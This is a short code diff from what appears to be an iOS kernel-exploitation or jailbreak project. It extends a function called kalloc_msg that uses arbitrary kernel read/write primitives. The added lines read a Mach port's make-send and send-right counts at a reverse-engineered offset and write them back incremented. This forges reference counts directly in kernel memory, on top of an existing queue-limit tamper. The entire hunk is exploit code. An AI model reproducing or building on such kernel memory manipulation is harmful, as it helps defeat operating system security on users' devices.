@@ -99,5 +99,12 @@ void *kalloc_msg(UInt64 size) {
 	uint16_t imq_qlimit = kread16_kfd(imq_qlimitoff);
 	AppendLog(@"imq_qlimit: %d",imq_qlimit);
 	kwrite16_kfd(imq_qlimitoff,imq_qlimit+1);
-	return message_buffer; // now pray this works.
+    uint64_t ip_mscount_off = 0x7c; // Found with RE.
+    mach_port_mscount_t mscount = kread32_kfd(object + ip_mscount_off);
+    AppendLog(@"Mscount: %d",mscount);
+    mach_port_rights_t srefs = kread32_kfd(object + ip_mscount_off + sizeof(mach_port_mscount_t));
+    AppendLog(@"Srefs: %d",srefs);
+    kwrite32_kfd(object + ip_mscount_off, mscount+1);
+    kwrite32_kfd(object + ip_mscount_off + sizeof(mach_port_mscount_t), srefs+1);
+	return (void*)message_buffer; // now pray this works.
 }
